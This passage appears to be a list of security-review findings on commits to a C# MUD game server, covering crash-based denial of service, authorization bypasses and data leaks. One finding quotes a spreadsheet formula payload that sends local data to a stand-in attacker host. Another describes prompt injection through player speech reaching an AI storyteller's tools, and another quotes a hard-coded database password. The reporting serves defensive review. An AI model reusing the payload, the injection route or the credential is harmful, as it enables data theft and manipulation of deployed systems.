description: This commit adds collection/dictionary rendering to ProgModule.DescribeProgVariable. For collection return types it casts the result to IList and recursively calls DescribeProgVariable on each item using the element type. However FutureProg execution returns variable.GetObject; CollectionVariable.GetObject is the underlying IList of IProgVariable elements, not unwrapped scalar objects. When a prog returning, for example, a text collection is executed with `prog execute`, the recursion reaches the scalar text case and attempts `(string)result` on a TextVariable object, causing InvalidCastException. The exception is outside the FutureProg execution catch block and outside command-level handling, so it can bubble out of ProcessPendingCommands and stop the main game loop. The command requires PermissionLevel.Admin, so this is not remotely exploitable by ordinary players, but it allows an Admin-level account to cause a whole-service availability failure without SeniorAdmin shutdown rights.

title: Hard-coded database credentials added to EF factory
description: A new FuturemudDatabaseContextFactory hard-codes a MySQL connection string with uid=futuremud and password=rpiengine2020. Even though the factory is intended for design-time EF tooling and points at localhost, committing reusable database credentials creates a credential-disclosure and insecure-default risk for operators who copy or deploy this configuration unchanged. If the database account exists with meaningful privileges and MySQL is reachable to an attacker, the exposed password can allow unauthorized database access.

title: Null combat settings can crash server command handling
description: RevalidateCombatSettingsAfterInitialisation now assigns the raw result of ResolveCombatSettingsAfterInitialisation to CombatSettings. CharacterCombatSettingsResolver.ResolveFallback can return null if the race/NPC/default setting is not usable and no global combat setting passes CanUse. The prior code retained the provisional setting in that case; the new code clears it. Once a character is in this null state, normal player-accessible commands such as `combat show` dereference the current setting without checking for null. PlayerConnection.AttemptCommand catches such exceptions, writes a crash log, and calls Environment.Exit(0), turning the null dereference into a server-wide availability issue. Exploitability depends on a game configuration or player-selectable character path where no combat settings validate for that character, so this is configuration-dependent rather than universally reachable.

title: Weather statistics CSV allows spreadsheet formula injection
description: The commit makes the weather statistics exporter actually emit CSV rows and metadata using EscapeCsv. EscapeCsv only quotes fields containing commas, quotes, CR/LF, or leading/trailing whitespace. It does not guard values beginning with spreadsheet formula trigger characters such as '=', '+', '-', or '@'. Weather event and season/controller names are included in the generated CSV metadata and row fields, and weather events can be named by SeniorAdmin users. A lower-privileged staff member who can create or rename weather events could choose a name such as '=WEBSERVICE("https://attacker/"&INFO("directory"))' or another spreadsheet formula payload. When a Founder runs impdebug weatherstats and opens the generated CSV in Excel/LibreOffice/Google Sheets, the formula can execute in the spreadsheet context, potentially exfiltrating local data or misleading/modifying the opened report. This was introduced by replacing the previous NotImplementedException in EscapeCsv with delimiter-only CSV escaping and adding metadata/row output that includes these names.

title: Shop buys can pull stock from private workshop areas
description: PermanentShop.StockedItems now builds its candidate stock list from AllShopCells. AllShopCells includes the shopfront, workshop, and stockroom. This is a security-relevant authorization regression because the normal buy flow only requires the buyer to be at the shop, then uses StockedItems to select purchasable items. Shop.Buy subsequently removes the selected item from its current holder/container/location and transfers it to the buyer. As a result, any item with ItemOnDisplayInShop in a private workshop/stockroom cell, inside a nested container there, or held by a character in those cells can become remotely purchasable from the public shop interface, bypassing physical access, locks/containers, and character possession boundaries. The previous implementation only considered characters in shopfront cells and shallow items in shopfront/stockroom cells, so expanding to AllShopCells and DeepItems introduced the workshop/private-area exposure.

title: Arena manager rating lookup leaks arbitrary characters
description: The newly added `arena manager rating [<arena>] <character>` command only verifies that the caller manages the selected arena, but it does not restrict the target character to someone visible to the caller, in the arena, or someone with an existing rating record for that arena. If the input is numeric, `ResolveCharacter` calls `actor.Gameworld.TryGetCharacter(id, true)`, which loads any matching character from the database into the cached actor set. The command then displays `target.HowSeen(... TrueDescription)` and default ratings for every combatant class even when the target has never participated in that arena. A low-privileged player who has been made an arena manager can iterate character IDs to confirm whether characters exist and reveal their true names/descriptions, bypassing normal perception/privacy boundaries. Repeated lookups can also force database loads and grow `_cachedActors` with arbitrary offline characters.

title: Extreme arena ratings can crash fixed-odds betting
description: This commit introduces rating-based fixed-odds pricing. `ComputeSideWinProbabilities` computes `Math.Pow(10.0, rating / 400)` for every side and then casts the normalized double back to decimal. Arena ratings and Elo K-factors are stored as high-precision decimals and are not capped. If any side rating is large enough for `Math.Pow` to produce `Infinity` (roughly rating > 123,000), normalization produces `Infinity / Infinity` or `NaN`, and casting that result to `decimal` throws an exception. The player-facing `arena bet odds` path calls `GetQuote` without a local try/catch. In production builds, an uncaught exception during player input is caught by `PlayerConnection.AttemptCommand`, logged, and followed by `Environment.Exit(0)`, killing the whole MUD server. Reaching such an extreme rating requires a special/misconfigured arena state, for example an admin using the existing unbounded Elo K-factor setting or seeded/imported rating data, but once present an authenticated remote player can trigger the crash by requesting fixed odds for the event.

title: Unbounded arena Elo K-factor can crash rating settlement
description: The new `arenaeventtype set elok` path validates only that the value is greater than zero. The value is then persisted in a very wide decimal column and later used directly as the multiplier in Elo delta calculations. Those deltas are added to persisted ratings with no upper bound, clamping, or exception handling around the arithmetic. A malicious or compromised Admin-level builder can set an extremely large K-factor, such as `decimal.MaxValue`, and cause completed arena events to produce enormous rating changes. Depending on current ratings and outcome, `rating.Rating + delta` can throw `OverflowException`; even before that, ratings can be persisted at nonsensical magnitudes. Since arena completion calls rating settlement as part of the lifecycle, this can impact game availability and world integrity.

title: Arena signup can hang on bad random name profiles
description: This change replaces the previous static DefaultStageNameTemplate with DefaultStageNameProfile and calls GenerateStageName during CompleteSignup. GenerateStageName invokes profile.GetRandomPersonalName(nonSaving: true) on the main signup path. The random-name generator's readiness check only verifies that each name-usage key exists, not that enough unique elements exist for the configured dice expression. During generation, duplicate rolls decrement the loop counter and continue. With a ready profile containing, for example, one given-name element but a dice expression that can request two given names, every duplicate roll after the first causes i-- and the loop never makes progress. The catch block in GenerateStageName does not help because this is non-termination, not an exception. If an arena combatant class is configured with such a profile, any authenticated player who can sign up for the event can consume the server's main processing thread and deny service.

title: Arena surrender can leave unrelated combat
description: This commit removes the command-level no-combat restriction from `arena` and permits `arena surrender` while a character is in combat. However, `CanSurrender` only checks that the character is a participant in a live surrender-enabled arena event; it does not check that the character is physically in the arena, that their current combat is the arena bout, or that their current opponent(s) are participants in that event. `Surrender` then unconditionally calls `participant.Combat?.LeaveCombat(participant)`. A player who is still registered as a participant in a live arena event can therefore use `arena surrender <event>` during an unrelated combat to escape that combat, bypassing normal flee/truce/combat-leave rules.

title: Teleport now scans entire zones, enabling CPU DoS
description: Character.Teleport now calls ReconcileTeleportCellMembership for the moving character and for every follower/rider/mount moved with them. That helper enumerates all cells in the target/current/source zones via Zone.Cells and checks each cell's Characters collection to look for duplicate memberships. Because Teleport is used by player-reachable systems such as arena signup staging and configurable teleport magic, an authenticated player who can repeatedly trigger a teleport can force O(number of cells in involved zones * moved characters) work on the server's main runtime path. In large zones or with parties/followers, this can be used to consume CPU and degrade or stall the single game loop.

title: AI storyteller ignores system prompt for tool calls
description: Before this commit, the storyteller tool loop received the configured system prompt and applied it to CreateResponseOptions.Instructions. The new code still logs the system prompt but no longer passes it to ExecuteToolCall, and ConfigureToolLoopResponseOptions no longer accepts or sets an instruction prompt. Player speech and room echo text are placed into a user message and sent to a tool-calling model with required tool use. As a result, a player in a surveilled room can embed prompt-injection instructions in speech or echo-triggered text, and those instructions are now evaluated without the operator's configured system policy that would normally constrain the AI to treat in-game text as data. The available tool surface includes persistent state mutations such as creating, updating, and deleting storyteller memories/situations, and custom FutureProg-backed tool calls. This can let a low-privileged player influence persistent AI storyteller state or trigger operator-configured side-effecting tools in deployments that enable the AI storyteller.
triage_group: AI Storyteller, Discord, Email & External Integrations

title: Arena autoschedule interval can terminate the server
description: The commit adds player-accessible arena manager auto-scheduling. The command only checks that the parsed interval is greater than zero, then calls ConfigureAutoSchedule, which immediately calls SyncRecurringSchedule. SyncRecurringSchedule calls ResolveNextRecurringTrigger, where a past reference time and an overly large interval can make reference.AddTicks(intervalTicks) exceed DateTime.MaxValue. For example, an arena manager could use an interval on the order of 10000 years with a 2020 reference date. The resulting ArgumentOutOfRangeException is not handled in the arena code. Player input exceptions are caught by PlayerConnection, logged as a crash, and then Environment.Exit(0) is called, taking the MUD server offline. The attack requires the character to be an arena manager for the target arena, but that role can be assigned to ordinary characters and should not permit process termination.

title: Server-wide speech history exposed to junior admins
description: The new speech-context feature records all character speech into a room effect unconditionally whenever HandleCharacterSpeechInRoomEvent is invoked. This happens before the storyteller loop filters by SubscribeToSpeechEvents, IsPaused, and IsCellSurveilled, so speech is stored even in rooms that no storyteller is monitoring and even when no storyteller will process the event. The RecentSpeechContextEffect is marked as a saving effect and stores the speaker name, target, and message text. The new recentspeech command, available to PermissionLevel.JuniorAdmin, retrieves and prints the retained messages for the current room without any additional authorization tied to storyteller ownership, surveillance configuration, or whether the admin witnessed the speech. Because admins can generally move to rooms, this creates a retroactive room speech log readable by lower-tier staff, including direct-target speech and speech that was not intended to be monitored by AI.
triage_group: AI Storyteller, Discord, Email & External Integrations

title: Unbounded AI storyteller background work queue
description: AI storyteller events such as room speech, crime events, and room echoes are reachable from normal in-game activity. This commit wraps storyteller processing in QueueStorytellerWork, which creates a new fire-and-forget task for every event and then waits on a per-storyteller SemaphoreSlim. The semaphore serializes execution, but it does not bound the number of pending tasks or retained prompts. Because each queued task captures the event prompt and may perform slow network calls to the OpenAI API, a player can spam speech/echo-generating actions in a surveilled room and accumulate an unbounded backlog. That can cause process memory pressure, thread-pool/continuation pressure, external API cost amplification, and eventual denial of service. The previous code executed the AI call synchronously; while that had its own latency problems, this commit newly removes backpressure without adding a bounded queue or rate limiter.
triage_group: AI Storyteller, Discord, Email & External Integrations

title: Unthrottled AI speech events can stall the game loop
description: When SubscribeToSpeechEvents is enabled for a storyteller, every character speech event in a surveilled room immediately invokes PassSpeechEventToAIStoryteller. That builds a prompt containing the player's message and calls ExecuteStorytellerPrompt. The tool loop then performs a blocking OpenAI call via CreateResponseAsync(...).GetAwaiter().GetResult(). Because this runs inline from the normal speech handling path and has no per-player, per-room, or per-storyteller rate limit, an authenticated player can repeatedly speak in a surveilled room to force repeated external model calls. This can block the single game loop/command processing thread for network/model latency, multiply across all subscribed storytellers, and consume API quota/cost. The 30-second tool execution budget is only checked between rounds and does not cancel a blocking API call in progress.
triage_group: AI Storyteller, Discord, Email & External Integrations

title: AI prompts and tool output are logged verbatim
description: The new DebugAIMessaging helper sends AI storyteller payloads to Gameworld.DebugMessage. The newly added call sites include the system prompt, user prompt, room echo classifier prompt/echo, AI response text, tool-call arguments, and tool-call output JSON. Gameworld.DebugMessage broadcasts these messages to any character in DebugMode and also writes them to Console; production startup wraps Console in FutureMUDConsoleWriter, which creates a persistent console log file. This can expose sensitive player activity, internal storyteller prompts, reference-document contents, character information returned by tools, and exception details to debug-mode staff and anyone with access to console logs. The debug payload is only length-capped, not redacted or gated by a logging level/configuration.
triage_group: AI Storyteller, Discord, Email & External Integrations

title: Skill gain cooldown bypass on non-positive prog results
description: Classic and theoretical improvement models now evaluate either an ImprovementProg or the improvement expression, then immediately return when the gain is non-positive. The NoTraitGain effect is only added after this check. Before this change, the cooldown was applied after a successful improvement chance/threshold check and before evaluating the gain amount. In worlds where the gain expression or new prog can return zero/negative for player-controllable states, an authenticated player can repeatedly trigger trait-use checks that reach the gain calculation without receiving the configured no-gain cooldown. This can be used to repeatedly execute configured FutureProgs and generate skill-improvement logs, and for dynamic/random progs it can allow players to retry until a positive gain is returned, bypassing intended progression throttling. The no-gain effect should be applied before any early return after the improvement chance succeeds, or at least also applied for non-positive gain results.

title: Player-controlled numeric outfit names can crash server
description: The updated IncrementNumberOrAddNumber regex now captures the entire trailing digit sequence into the number group and immediately parses it as an int. For inputs such as "2147483648" or "foo2147483648", int.Parse throws OverflowException. This is reachable from normal player commands: a player can create an outfit with an oversized numeric name, receive an outfit-teach proposal, and accept it using the same colliding name, causing the duplicate-name loop to call IncrementNumberOrAddNumber on attacker-controlled text. PlayerConnection treats any exception during command handling as a crash and calls Environment.Exit(0), so this becomes an authenticated remote denial of service.

title: GPT errors leak raw exception details to Discord
description: The new GPT error handler logs the complete exception object to both console and Discord. Because Exception.ToString() includes exception messages, stack traces, file paths, and provider/client response details, GPT failures can disclose operational information to the Discord admin channel and to Discord as a third-party service. Some OpenAI/authentication errors may include sensitive configuration details such as API-key fragments or request/provider metadata. The Discord forwarding path also wraps attacker/provider-controlled text in Markdown code fences without escaping or truncation, so embedded backticks or oversized exception text can break formatting or cause Discord embed failures. The affected GPT request path is reachable from builder-facing description suggestion commands when OpenAI is configured.
triage_group: AI Storyteller, Discord, Email & External Integrations

title: Unbounded arena bet history can exhaust server resources
description: This commit introduces `arena bet history [<count>]`. The command parses any positive 32-bit integer and passes it directly to `GetBetHistory`, which uses it as the EF `Take(count)` limit and then formats every returned row into a text table. There is no maximum page size or pagination. Because cancelled bets remain in `ArenaBets` and `CanBet` only blocks currently active non-cancelled bets, a player can repeatedly place and cancel wagers to accumulate many historical rows, then request a very large history count. On a single-loop MUD server, the resulting database query, materialization, table formatting, and output buffering can consume significant CPU/memory and degrade or deny service for other players.

title: DST-invalid arena times can crash the server
description: DateUtilities.TryParseDateTimeOrRelative now calls TimeZoneInfo.ConvertTimeToUtc(parsed, account.TimeZone) whenever DateTime.TryParse returns an unspecified DateTime. ConvertTimeToUtc throws ArgumentException for invalid local times, such as times skipped during daylight-saving transitions (for example, 2026-03-08 02:30 in America/New_York). The arena event create, schedule, and registration commands call this helper without catching that exception. In production, PlayerConnection.AttemptCommand catches command exceptions and calls Environment.Exit(0), so an authenticated Admin with a DST-observing account timezone can remotely terminate the MUD process by entering an invalid local arena event time.

title: Arena signup allows unrestricted player teleport
description: The public `arena signup` command is available to ordinary conscious, non-combat player characters. After only checking arena registration state, side, class eligibility, capacity, and side policy, `SignUp` now calls `HandleSignupStaging`, which directly invokes `character.Teleport(waitingCell, RoomLayer.GroundLevel, false, false)`. `Teleport` bypasses normal movement/exit checks and removes movement/action effects. A normal player can therefore sign up for an open arena event from anywhere to be moved into the configured waiting room, bypassing locks, guards, confinement, or location-based restrictions. Withdrawing or leaving staging only removes the signup/effect and does not return the player to their original location, so this can become an unintended fast-travel or escape primitive depending on arena room placement.

title: Movement auto-grants flight to carried characters
description: The new StartMove logic derives a required position from the exit and directly calls SetState(requiredPosition) for every CharacterMover. Movement membership includes riders and dragged targets, but those participants are not individually checked with CanMove/CanFly in the same way as normal movers: drag targets are accepted early, and riders skip the CanMove check when RidingMount is not null. Therefore, if a flying mount or dragger starts a fly-only movement, the rider or dragged character is also set to PositionFlying even if their body cannot fly. Dismount only clears RidingMount and does not restore a grounded/riding position, and the fly heartbeat spends stamina without revalidating wings/flight capability. This can let authenticated players bypass fly-only movement/location restrictions or safely remain/land where a non-flying character should not be able to.

title: Repair craft input can crash server via item products
description: ConditionRepairInput implements ICraftInputConsumesGameItem, whose contract says its CraftInputData.Perceivable is the consumed IGameItem. However, ConditionRepairInput.NonDeletingItemInputData returns a PerceivableGroup from Perceivable. Builder validation for UnusedInputProduct and ScrapInputProduct accepts any ICraftInputConsumesGameItem, so a builder can create a valid craft whose product references the repair input. When the craft reaches product generation, those products cast Data.Perceivable to IGameItem for single-item inputs. With a repair input this is actually a PerceivableGroup, causing an InvalidCastException. Product generation runs from the effect scheduler without local exception handling; the exception propagates out of the game loop to Main, which writes a crash log and exits the process. This gives a lower-privileged builder, or any player able to trigger a preconfigured vulnerable craft, a reliable server availability impact.

title: Tool durability formulas allow staff-triggered DoS
description: HandTool and PowerTool prototypes now accept a free-form ExpressionEngine formula for durability. The setter only evaluates the expression once using Standard quality and does not verify that results are finite, non-negative, and within TimeSpan.FromSeconds bounds for all valid item qualities. Runtime tool use calls MaximumDuration(), which directly executes the stored expression for the actual item's quality and passes the result to TimeSpan.FromSeconds without range checks or exception handling. For example, a malicious Admin could set a durability formula such as if(quality == 6, 1e20, 3600). It passes the Standard-quality test, and the OLC display only samples Terrible/Standard/Legendary, but any Good-quality tool using that component will throw OverflowException during craft tool consumption. Since craft execution invokes UseTool directly for phase tools, this provides a staff-privileged availability attack against the game loop/service.

title: Bank list leaks all branch room IDs to players
description: The changed BankHelper list output now includes a Locations column populated from every bank's BranchLocations. Those locations are formatted with GetFriendlyReference, which includes both the cell's visible name and its numeric cell ID. The bank command has no CommandPermission attribute, and its list subcommand unconditionally forwards to GenericBuildingCommand, so any authenticated in-game player can run bank list and enumerate all bank branch cells. If some bank branches are hidden, staff-only, remote, or otherwise not intended to be discoverable, this leaks world layout and object IDs that can assist other abuse or metagaming.

title: Arena participants can bypass self-betting check
description: The commit adds a concrete ArenaParticipant implementation whose Character property memoizes the first ICharacter object returned by TryGetCharacter(..., true). If that property is first evaluated while the participant is offline, it can cache a detached/cached character instance. When the same player later logs in, commands run as the live actor instance, but ArenaBettingService.CanBet only rejects participants when x.Character == actor, i.e. object identity/reference equality. The IDs can match while the references differ, so the participant-self-betting restriction is bypassed. An authenticated player who is signed up for an event can use this to wager on their own bout, violating the intended betting authorization boundary and enabling in-game economy manipulation/conflicted betting.

title: WhyCantMount type confusion can crash boolean FutureProgs
description: The commit adds WhyCantMountFunction with compiler metadata and ReturnType both set to ProgVariableTypes.Boolean, but every execution path assigns Result to a TextVariable. FutureProg compilation trusts the declared ReturnType, so this function can be used in boolean contexts such as if/while conditions or returned from a boolean prog. At runtime, boolean execution paths cast Result.GetObject to bool/bool?, which will throw when the object is actually a string. Some FutureProg execution catches exceptions and returns null, but ExecuteBool casts the returned object outside the internal FutureProg try/catch; many game systems call ExecuteBool from player-triggered commands and game-loop logic. If an admin/builder uses the new function in a boolean prog attached to mount or other normal gameplay checks, a remote player can trigger the prog and potentially terminate the player command handler/server process or disrupt game-loop logic.

title: Mounted currency retrieval bypasses new reach checks
description: This commit adds MountedCanRetrieve/MountedCanManipulate checks to block item interaction while riding. However, the currency-specific get paths do not pass the actual in-world currency pile to the new mounted check. Instead, they build a temporary currency pile and call CanGet on that temporary item. MountedCanInteractWith explicitly returns true when the item's top-level Location differs from the rider's Location; for these temporary items Location is null, so the mounted restriction is bypassed. The subsequent Get(ICurrency, ...) path removes coins from the real in-world piles and gives the newly-created pile to the mounted actor. An authenticated player can therefore use currency get commands while mounted even though ordinary ground item retrieval is denied.

title: Clock creation can persist a startup-crashing clock
description: This commit adds a HighAdmin-accessible `clock new` command. The new `Clock(IFuturemud, string, string)` constructor initializes normal hour interval names but never initializes `CrudeTimeIntervals`. `SaveToXml()` serializes whatever crude intervals exist, so a newly created clock serializes an empty `<CrudeTimeIntervals />` element. On startup, `LoadFromXml()` treats a missing or element-empty `CrudeTimeIntervals` node as fatal and throws an `XmlException`; `FuturemudLoaders.LoadClocks()` constructs each clock from the database without catching per-clock load failures. Additionally, the constructor initially inserts the DB row with `Definition = string.Empty`, so depending on whether a later save occurs before restart, the loader can fail either parsing an empty definition or loading XML with no crude intervals. Because the command is gated to HighAdmin, this is a privileged persistent denial of service rather than an unauthenticated remote issue, but it can brick the game until the bad clock row is repaired in the database.

title: Mounted movement echo can crash the game loop
description: The new rider echo paths in DescribeEnterMove, DescribeBeginMove, and Describe assume item.Key.CurrentSpeed is non-null for the mount. However, CurrentSpeed explicitly returns null when the character's current PositionState has no registered movement speed. The movement construction path can still create a movement for a mounted rider even when evaluating the mount fails, because the recursive EvaluateCharacterForAdditionToMovement call for character.RidingMount ignores its return value. When InitialAction sends DescribeBeginMove to room observers, this null dereference is not caught inside command processing or the game loop; in release Main catches the exception only outside StartGameLoop and then exits the process. A normal authenticated player with access to a mount can plausibly put the mount into a non-moving position and issue a movement command to crash the server.

title: Clean command can remove uncleanable contamination
description: The clean command is available to normal players. Before this commit, GetCleanableEffectQueue filtered ICleanableEffect instances to only those with a non-null LiquidRequired, with an explicit comment in the parent revision that this filtered out non-cleanable liquids. The new code queues all applicable cleanable effects. Later, effects with LiquidRequired == null pass the liquid suitability filter, and CleanAction removes such effects outright in the non-liquid branch. LiquidContamination and ResidueContamination can return null LiquidRequired when the contaminating liquid/material has no configured solvent, while still having a cleaning tool tag. As a result, an authenticated player with the configured cleaning tool can remove contamination/residue that game data marked as having no solvent, bypassing intended world-state integrity rules.

title: Admin blood model command can crash the MUD server
description: The commit adds Admin-accessible blood type and population blood model editing. A newly created blood type is added to the game world but is not associated with any existing IBloodModel. When an Admin edits a new population blood model and runs `popbloodmodel set type <new-bloodtype> 1`, `BuildingCommandType` attempts to resolve the owning blood model with `Gameworld.BloodModels.First(x => x.Bloodtypes.Contains(bt))`. If no blood model contains the selected blood type, `First` throws `InvalidOperationException`. Player command handling catches exceptions by writing a crash log and calling `Environment.Exit(0)`, so this becomes a reliable process-kill denial of service for any compromised or malicious Admin-level account. The code should use `FirstOrDefault`, reject unattached blood types with an error, and ideally validate weights with `double.IsFinite(weight)` as well.

title: Time-filtered weather selection can crash server
description: The commit changed initial weather selection from choosing any event configured for the season to choosing only events present in the new per-time-of-day cache. If a SeniorAdmin-configured climate model has events for a season but none of those events are permitted at the current time of day, RandomEventForSeason returns null. WeatherController construction immediately writes CurrentWeatherEvent.Id to the database model without checking for null. Because player command exceptions call Environment.Exit in production, a SeniorAdmin using the weathercontroller creation path with such a climate/weather configuration can terminate the MUD process. This is not remotely reachable by normal players, but it is a privileged availability bug introduced by the cache/time filtering change.

title: fillgas drains gas sources without access checks
description: The commit adds a new FillGas command available to normal players. It resolves the source gas container with TargetItem and verifies only that it is an IGasContainer and non-empty. The command then calls CanManipulateItem only for the held target container, never for the source, before subtracting gas from the source and adding it to the target. This means a player can transfer gas out of any visible source item that TargetItem can resolve, even if location/property/container rules would make that source non-manipulable. In-game gas supplies can represent scarce resources, medical/drug gases, or life-support supplies, so this is an authorization bypass affecting world integrity and possibly in-game availability.

title: Delayed shop buy confirmation bypasses purchase checks
description: The commit changes BUY so that purchases of soon-to-morph items are delayed behind an ACCEPT prompt. The initial command performs CanBuy and payment checks, but the stored AcceptAction later calls shop.Buy(actor, merch, quantity, payment) directly. During the 120 second window, the player can move away from the shop, spend/drop/transfer their cash, queue multiple purchases against the same funds, have credit permissions/limits change, or have stock/trading state change. Shop.Buy assumes validation has already happened; it removes stock and only then calls method.TakePayment. For cash payments, TakePayment uses the player's current accessible currency and does not verify that the full price was found; Currency.FindCurrency returns partial or empty results when funds are insufficient. This allows an authenticated player to receive near-morph shop goods for less than the validated price, including for free, and can corrupt persistent shop/economy state.

title: Unbounded need-delta spells can shut down the server
description: NeedDeltaEffect's builder commands only check double.TryParse and do not reject non-finite or excessively large values. GetOrApplyEffect passes those values directly into Body.FulfilNeeds. FulfilNeeds adds SatiationPoints to FoodSatiatedHours before calculating delayed alcohol absorption, and if AlcoholLitres is positive it constructs a TimeSpan from a formula based on FoodSatiatedHours before NormaliseValues can clamp it. For example, an Admin-level magic builder can configure a needdelta spell with a huge positive hunger value such as 1E300 and a positive drunk value. When the spell is cast, TimeSpan.FromMinutes receives an out-of-range value and throws. PlayerConnection catches command exceptions and calls Environment.Exit(0), taking the MUD server offline. This is limited to accounts able to edit magic spells, but it creates a new lower-staff availability risk in a command area below SeniorAdmin shutdown privileges.

title: Group movement lets riders move mounts without control
description: The new GroupMovement constructor automatically adds any party member's RidingMount to the movement and marks riders as moving, but it does not verify that the party member is the primary rider or that the mount permits that rider to control it. Character.Move normally delegates mounted movement through RiderMove only for the primary rider, where PermitControl is checked. The group path is evaluated before that mounted-control path, and GroupMovement later calls ExecuteMove on every CharacterMover. When ExecuteMove runs on the added mount, it moves every character in the mount's Riders collection. As a result, an authenticated player who is riding a multi-rider mount, or who is in a party with such a rider, can cause the mount and other riders to move via party movement without being the authorized controller. This can force another player's character to cross exits or enter dangerous areas, and it also causes duplicate movement processing for rider/mount combinations.

title: Discord show commands bypass MUD authorization
description: The new Discord commands only require the Discord user to be in the bot's authorised-user list and to have any linked MUD account. On the MUD side, HandleShowAccountTcpCommand reads the requester id but never checks viewer.Authority before calling ShowModule.BuildAccountInfo, which exposes email address, last IP address, authority, resources, and character lists. HandleShowCharacterTcpCommand explicitly discards the requester id and returns character.ShowStat for any character id, exposing information that the in-game Show_Character command guards with actor.IsAdministrator(). This bypasses the MUD permission boundary when a Discord-authorised user is linked to a non-admin MUD account or when the Discord bot allowlist is broader than MUD staff. Additionally, showcharacter accepts an arbitrary string in the Discord module but the MUD handler uses long.Parse, and showaccount calls BuildAccountInfo after leaving the FMDB using block even though BuildAccountInfo uses FMDB.Context/lazy-loaded dbaccount data; these can throw unhandled exceptions from DiscordConnection.HandleMessages and stop the game loop.
triage_group: AI Storyteller, Discord, Email & External Integrations

title: Mounted land bypasses mount landing checks
description: When a primary rider issues `land`, `Character.Land` now immediately calls `RidingMount.RiderMovePosition(...)` and returns before executing `CanLand()`. `CanLand()` is the method that enforces that the actor is actually flying and not blocked by general movement restrictions such as state, melee engagement, movement in progress, and move-blocking effects. The mount-side `RiderMovePosition` path only checks `PermitControl` and `CanMovePosition`, and `CanMovePosition` only validates basic positional feasibility; it does not enforce the landing-specific precondition or general movement restrictions. As a result, an authenticated player who is the primary rider of a controllable mount can use `land` to force the mount into standing/swimming position even when the mount is not flying or when the mount would fail `CanLand()`.

title: Container get check no longer requires containment
description: The changed Body.CanGet(item, container, ...) logic now only rejects a take when the target item is already in the specified container and container.CanTake returns false. If the item is not in the specified container, or if the supplied container item is not actually an IContainer, the method can still return true after checking only the target item's generic pick-up rules. Downstream code assumes CanGet proved both container type and containment, then calls container.Take and transfers the item. This can let server-side callers such as FutureProg get/canget treat unrelated items as retrievable from an arbitrary accessible container, potentially bypassing closed/actual container restrictions, corrupting inventory state, or crashing when a non-container is supplied. Direct player get/take commands generally resolve target items from container contents first, so the most realistic security impact is through builder-authored or otherwise exposed FutureProg/in-game automation rather than an unauthenticated raw command.

title: Build setup executes unverified installer from predictable /tmp
description: scripts/setup.sh downloads https://dot.net/v1/dotnet-install.sh to the predictable shared path /tmp/dotnet-install.sh and then executes that file with bash. Because /tmp is world-writable, a local attacker on a shared build host can pre-create or race-modify that path before execution, potentially causing code execution as the user running setup.sh. The script also performs no checksum/signature verification or pinning of the downloaded installer before executing it, so compromise of the download endpoint/TLS trust path would execute arbitrary code on developer or CI machines. AGENTS.md explicitly instructs local or automated checks to run this setup script, making the unsafe path part of the recommended workflow.

title: Lease autorekey rekeys tenants' private lockable items
description: The commit adds a player-accessible `property autorekey` option for property owners and invokes `Property.RekeyAllLocks()` when a lease ends. `RekeyAllLocks()` walks `cell.GameItems.SelectMany(x => x.DeepItems)` for every property cell and assigns the new lock pattern to every `ILock` component it finds. `DeepItems` includes the item itself and recursively all contents of containers, so this affects tenant or visitor-owned lockable objects left in the property, such as locked boxes, not only property doors or installed locks. The method then creates replacement property keys with the same pattern, which the owner can claim after the lease ends. If any replacement key has a compatible lock type, the owner can open the victim's rekeyed container; even without a compatible key, the victim's original key is invalidated, causing unauthorized denial of access to their belongings.

title: Temporary weather-freeze spells can freeze weather permanently
description: This commit introduces WeatherFrozen state as a reference counter on IWeatherController/WeatherController and new weather-freeze spell effects. The counter stops normal weather progression whenever it is greater than zero. However, SpellWeatherFreezeEffect only calls UnfreezeWeather in ExpireEffect. Magic spell child effects are not independently scheduled; the scheduled MagicSpellParent removes its children with RemoveEffect(child, true), which invokes RemovalEffect, not ExpireEffect. SpellWeatherFreezeEffect does not override RemovalEffect, so a normal temporary spell duration expiring leaves the weather controller frozen indefinitely. Additionally, WeatherFreezeEffect and WeatherChangeFreezeEffect call FreezeWeather before constructing SpellWeatherFreezeEffect, whose constructor also calls FreezeWeather, so even direct child expiration would only decrement one of two increments. An authenticated player able to cast one of these intended temporary weather-freeze spells could persistently disrupt the shared area/zone weather controller until staff manually repair server state.

title: Spell telepathy can eavesdrop on all thoughts globally
description: TelepathySpellEffect applies a SpellTelepathyEffect directly to the spell target and passes a null applicability prog. SpellTelepathyEffect implements ITelepathyEffect but does not override Applies, so it inherits Effect.Applies, which returns true for every target when ApplicabilityProg is null. CommunicationsModule sends private think and feel text to any character with an ITelepathyEffect for which Applies(actor) is true. As a result, if a telepathy spell is made available to normal players and can target self or the attacker, the affected player becomes a global listener for all character thoughts/feelings, not just the intended spell target or local/ranged targets.

title: Scheduler can starve game loop on self-rescheduling jobs
description: Scheduler.CheckSchedules previously used a single DateTime.UtcNow snapshot for the whole dispatch pass, which limited processing to schedules that were due at the start of the pass. The new code recomputes DateTime.UtcNow inside the while loop. This means a schedule that fires and re-adds itself with a TriggerETA based on its previous TriggerETA, or a recursive FutureProg that schedules another short-delay execution, can be immediately considered due again if the action took at least as long as the interval. Because Futuremud calls Scheduler.CheckSchedules from the single main game loop, this can starve command processing and connection cleanup. RepeatingSchedule is especially relevant because it advances TriggerETA by the fixed duration from the old trigger time and immediately re-adds itself. Builder-authored FutureProg can also create arbitrary millisecond delayed schedules via delayprog, making a low-privileged builder able to create a reliable availability issue with a small positive recursive delay and sufficiently expensive body.

title: Mind anesthesia powers persist unregistered loader key
description: MagicPowerBase now writes DatabaseType into MagicPowers.PowerModel. Most new DatabaseType values match their MagicPowerFactory.RegisterLoader keys, but MindAnesthesiaPower does not: it persists "mindanesthesia" and registers only "anesthesia". MagicPowerFactory.LoadPower indexes the PowerLoaders dictionary directly with the stored PowerModel, so a saved mind anesthesia power produces a missing-key exception during LoadMagic. Because LoadMagic runs during startup database loading, this can cause a persistent denial of service until the bad database row is manually corrected or a matching loader alias is added. The creation path is gated by PermissionLevel.Admin, so this is not reachable by unauthenticated users or normal players, but it is still an availability issue across the staff privilege boundary.

title: MindBroadcast text can crash server via format braces
